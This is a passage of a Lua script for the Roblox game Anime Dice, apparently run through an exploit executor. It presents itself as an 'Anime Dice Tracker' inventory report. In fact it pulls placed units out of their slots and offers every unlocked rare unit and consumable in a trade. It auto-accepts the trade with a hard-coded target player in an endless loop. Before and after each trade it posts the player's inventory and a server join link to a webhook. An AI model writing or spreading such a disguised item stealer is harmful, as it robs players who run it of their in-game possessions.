local function httpPost(url, body)
    local payload = { Url=url, Method="POST",
                      Headers={["Content-Type"]="application/json"}, Body=body }
    if typeof(request) == "function" then
        local ok, res = pcall(request, payload); if ok and res then return true, res end
    end
    if typeof(http_request) == "function" then
        local ok, res = pcall(http_request, payload); if ok and res then return true, res end
    end
    if typeof(http) == "table" and typeof(http.request) == "function" then
        local ok, res = pcall(http.request, payload); if ok and res then return true, res end
    end
    return false, "No HTTP library"
end

local function buildUnitFields(inv)
    local allowed = {}
    for r, on in pairs(RARITY_FILTER) do if on then allowed[r] = true end end
    local byRarity = {}
    for r in pairs(allowed) do byRarity[r] = {} end
    local totalUnits, uniqueCount = 0, 0
    for key, entry in pairs(inv) do
        if type(key) == "string" and type(entry) == "table" and entry.name then
            local cfg = EntryRegistry.getEntryConfig(entry.name)
            if cfg and cfg.kind == "Unit" then
                local rarity = getRarity(entry)
                if rarity and allowed[rarity] then
                    local amt = math.max(1, math.floor(tonumber(entry.amount) or 1))
                    byRarity[rarity][#byRarity[rarity]+1] = { name=entry.name, amount=amt }
                    totalUnits += amt; uniqueCount += 1
                end
            end
        end
    end
    for _, list in pairs(byRarity) do
        table.sort(list, function(a,b)
            if a.amount ~= b.amount then return a.amount > b.amount end
            return a.name < b.name
        end)
    end
    local fields = {}
    for _, rarity in ipairs(RARITY_ORDER) do
        local list = byRarity[rarity]
        if list and #list > 0 then
            local lines, bufLen, tierTotal = {}, 0, 0
            for _, u in ipairs(list) do
                tierTotal += u.amount
                local line = ("`%s` **%s** x%s"):format(RARITY_TAG[rarity] or "[?]", u.name, fmtNum(u.amount))
                if bufLen + #line + 1 > 1000 then lines[#lines+1] = "..."; break end
                lines[#lines+1] = line; bufLen = bufLen + #line + 1
            end
            fields[#fields+1] = {
                name = ("%s -- %d unique, %d total"):format(rarity, #list, tierTotal),
                value = table.concat(lines, "\n"), inline = false,
            }
        end
    end
    return fields, totalUnits, uniqueCount
end

local function buildItemFields(inv)
    local want = {}
    for _, n in ipairs(CONSUMABLES) do want[n] = true end
    local items, totalItems = {}, 0
    for key, entry in pairs(inv) do
        if type(key) == "string" and type(entry) == "table" and entry.name then
            if want[entry.name] then
                local amt = tonumber(entry.amount) or 0
                if amt > 0 then
                    items[#items+1] = { name=entry.name, amount=math.floor(amt), tag=itemTag(entry.name) }
                    totalItems += math.floor(amt)
                end
            end
        end
    end
    if #items == 0 then return {}, 0 end
    table.sort(items, function(a,b)
        if a.amount ~= b.amount then return a.amount > b.amount end
        return a.name < b.name
    end)
    local fields, lines, bufLen = {}, {}, 0
    local fieldHeader = ("Consumables -- %d types, %d total"):format(#items, totalItems)
    for _, it in ipairs(items) do
        local line = ("`%s` **%s** x%s"):format(it.tag, it.name, fmtNum(it.amount))
        if bufLen + #line + 1 > 1000 then
            fields[#fields+1] = {
                name = (#fields == 0) and fieldHeader or "Consumables (cont.)",
                value = table.concat(lines, "\n"), inline = false,
            }
            lines, bufLen = {}, 0
        end
        lines[#lines+1] = line; bufLen = bufLen + #line + 1
    end
    if #lines > 0 then
        fields[#fields+1] = {
            name = (#fields == 0) and fieldHeader or "Consumables (cont.)",
            value = table.concat(lines, "\n"), inline = false,
        }
    end
    return fields, totalItems
end

local function sendInventoryWebhook(label)
    if WEBHOOK_URL == "" then return false end
    local inv = deepUnwrap(DataController.Inventory)
    if type(inv) ~= "table" then return false end

    local unitFields, totalUnits, uniqueUnits = buildUnitFields(inv)
    local itemFields, totalItems = buildItemFields(inv)
    local placeId, jobId = tostring(game.PlaceId), tostring(game.JobId)
    local webLink = ("https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
    local players, maxPlayers = #Players:GetPlayers(), Players.MaxPlayers
    local shortJob = #jobId > 20 and (jobId:sub(1,20) .. "...") or jobId

    local allFields = {}
    allFields[#allFields+1] = {
        name = "Server Information",
        value = ("**Join:** [Click to Join](%s)\n**Job ID:** `%s`\n**Players:** `%d / %d`\n**Place ID:** `%s`"):format(
            webLink, shortJob, players, maxPlayers, placeId),
        inline = false,
    }
    for _, f in ipairs(unitFields) do
        if #allFields >= 25 then break end
        allFields[#allFields+1] = f
    end
    for _, f in ipairs(itemFields) do
        if #allFields >= 25 then break end
        allFields[#allFields+1] = f
    end

    local embedColor, colorChosen = 0x2ECC71, false
    for _, rarity in ipairs(RARITY_ORDER) do
        if colorChosen then break end
        for _, f in ipairs(unitFields) do
            if string.find(f.name, rarity, 1, true) then
                embedColor = RARITY_COLOR[rarity] or embedColor
                colorChosen = true; break
            end
        end
    end

    local summary = {}
    summary[#summary+1] = ("**Player:** `%s`"):format(LocalPlayer.Name)
    summary[#summary+1] = ("**Server:** `%d/%d` players"):format(players, maxPlayers)
    if uniqueUnits > 0 then
        summary[#summary+1] = ("**Rare units tracked:** `%d` unique / `%d` total"):format(uniqueUnits, totalUnits)
    end
    if totalItems > 0 then
        summary[#summary+1] = ("**Consumables tracked:** `%d`"):format(totalItems)
    end

    local titleSuffix = label and (" -- " .. label) or ""
    local payload = {
        username = "Anime Dice Tracker",
        embeds = {{
            title = ("Inventory Report%s"):format(titleSuffix),
            url = webLink,
            description = table.concat(summary, "\n"),
            color = embedColor,
            fields = allFields,
            footer = { text = ("Anime Dice Tracker - %s"):format(os.date("%Y-%m-%d %H:%M:%S")) },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }},
        components = {{
            type = 1,
            components = {
                { type = 2, style = 5, label = "Join This Server", url = webLink },
            }
        }}
    }
    local json = HttpService:JSONEncode(payload)
    local ok = httpPost(WEBHOOK_URL, json)
    return ok
end

--=====================================================================
-- Trade logic
--=====================================================================
local trade = {
    active=false, phase="Offer", ownOffer={},
    ownReady=false, otherReady=false, ownAccepted=false, otherAccepted=false,
}

TradeEvent:Connect(function(name, data)
    if type(name) ~= "string" then return end
    data = type(data) == "table" and data or {}
    if name == "Started" then
        trade.active=true; inTrade=true
        trade.phase="Offer"; trade.ownOffer={}
        trade.ownReady, trade.otherReady = false, false
        trade.ownAccepted, trade.otherAccepted = false, false
    elseif name == "Updated" then
        trade.active=true; inTrade=true
        trade.phase = type(data.phase)=="string" and data.phase or "Offer"
        trade.ownOffer = type(data.ownOffer)=="table" and data.ownOffer or {}
        trade.ownReady = data.ownReady == true
        trade.otherReady = data.otherReady == true
        trade.ownAccepted = data.ownAccepted == true
        trade.otherAccepted = data.otherAccepted == true
    elseif name == "Ended" then
        trade.active=false; inTrade=false
        trade.phase="Offer"; trade.ownOffer={}
        trade.ownReady, trade.otherReady = false, false
        trade.ownAccepted, trade.otherAccepted = false, false
    end
end)

local function pickupPlacedUnits()
    local slots = deepUnwrap(DataController.Slots)
    if type(slots) ~= "table" then return 0 end
    local slotList = {}
    for slotNum, data in pairs(slots) do
        if type(data) == "table" and data.unitId then
            slotList[#slotList+1] = { slot = tonumber(slotNum) or slotNum, data = data }
        end
    end
    table.sort(slotList, function(a,b) return tonumber(a.slot) < tonumber(b.slot) end)
    local removed = 0
    for _, item in ipairs(slotList) do
        local rarity = getRarity(item.data)
        if rarity and RARITY_FILTER[rarity] then
            fire(InteractSlot, item.slot)
            removed += 1
            task.wait(PICKUP_DELAY)
        end
    end
    if removed > 0 then task.wait(1.5) end
    return removed
end

local function buildOffer()
    local inv = deepUnwrap(DataController.Inventory)
    if type(inv) ~= "table" then return {} end
    local want = {}
    for _, n in ipairs(CONSUMABLES) do want[n] = true end
    local plan = {}
    for key, entry in pairs(inv) do
        if type(key) == "string" and type(entry) == "table" and entry.name then
            local cfg = EntryRegistry.getEntryConfig(entry.name)
            if cfg and cfg.kind == "Unit" then
                local rarity = getRarity(entry)
                if rarity and RARITY_FILTER[rarity] then
                    local locked = entry.attributes and entry.attributes.locked == true
                    if not locked then
                        plan[#plan+1] = { key=key, amount=math.max(1, tonumber(entry.amount) or 1) }
                    end
                end
            elseif want[entry.name] then
                local amt = tonumber(entry.amount) or 0
                if amt > 0 then plan[#plan+1] = { key=key, amount=math.floor(amt) } end
            end
        end
    end
    return plan
end

local function offerMatchesPlan(plan)
    for _, e in ipairs(plan) do
        if (tonumber(trade.ownOffer[e.key]) or 0) < e.amount then return false end
    end
    return true
end

local function pushOneChunk(plan)
    for _, e in ipairs(plan) do
        local have = tonumber(trade.ownOffer[e.key]) or 0
        local missing = e.amount - have
        if missing > 0 then
            local chunk = 1
            for _, step in ipairs({ 1000, 100, 10 }) do
                if missing >= step then chunk = step; break end
            end
            fire(ChangeOffer, e.key, chunk)
            return true
        end
    end
    return false
end

local function waitForOfferSync(plan, timeout)
    timeout = timeout or 15
    local deadline = os.clock() + timeout
    local lastPush = 0
    while os.clock() < deadline do
        if offerMatchesPlan(plan) then return true end
        if os.clock() - lastPush >= OFFER_PUSH_DELAY then
            if pushOneChunk(plan) then lastPush = os.clock()
            else return false end
        end
        task.wait(0.05)
    end
    return false
end

local function holdReady()
    for _ = 1, READY_MAX_RETRIES do
        if trade.ownReady then return true end
        fire(AdvanceTrade)
        local deadline = os.clock() + READY_RETRY_DELAY
        while os.clock() < deadline do
            if trade.ownReady or trade.phase == "Confirm" then return true end
            task.wait(0.1)
        end
    end
    return false
end

local function findTarget()
    for _, p in Players:GetPlayers() do
        if p ~= LocalPlayer
            and (string.lower(p.Name) == string.lower(TARGET_NAME)
                 or string.lower(p.DisplayName) == string.lower(TARGET_NAME))
        then return p end
    end
    return nil
end

local function tradeRound()
    local target
    while not target do
        target = findTarget()
        if not target then task.wait(1) end
    end
    task.wait(2)
    if not target.Parent then return end
    pickupPlacedUnits()
    local plan = buildOffer()
    if #plan == 0 then task.wait(5); return end
    if WEBHOOK_ON_START then pcall(sendInventoryWebhook, "Pre-Trade") end
    fire(RequestTrade, target)

    local startDeadline = os.clock() + 10
    while not trade.active and os.clock() < startDeadline do task.wait(0.1) end
    if not trade.active then task.wait(3); return end

    if not waitForOfferSync(plan, 20) then fire(CancelTrade); task.wait(3); return end
    task.wait(OFFER_SETTLE_WAIT)

    if not offerMatchesPlan(plan) then
        if not waitForOfferSync(plan, 10) then fire(CancelTrade); task.wait(3); return end
    end
    holdReady()

    local partnerDeadline = os.clock() + 60
    while not trade.otherReady and os.clock() < partnerDeadline do
        if not target.Parent then return end
        if not trade.ownReady and trade.phase ~= "Confirm" then holdReady() end
        task.wait(0.3)
    end
    if trade.phase == "Confirm" then
        for _ = 1, READY_MAX_RETRIES do
            if trade.ownAccepted then break end
            fire(AdvanceTrade)
            task.wait(0.5)
        end
    end
    if WEBHOOK_ON_END then
        task.wait(2)
        pcall(sendInventoryWebhook, "Post-Trade")
    end
end

--=====================================================================
-- Driver loop
--=====================================================================
while true do
    if _G.AutoTradeEnabled then
        pcall(tradeRound)
    end
    task.wait(3)
end
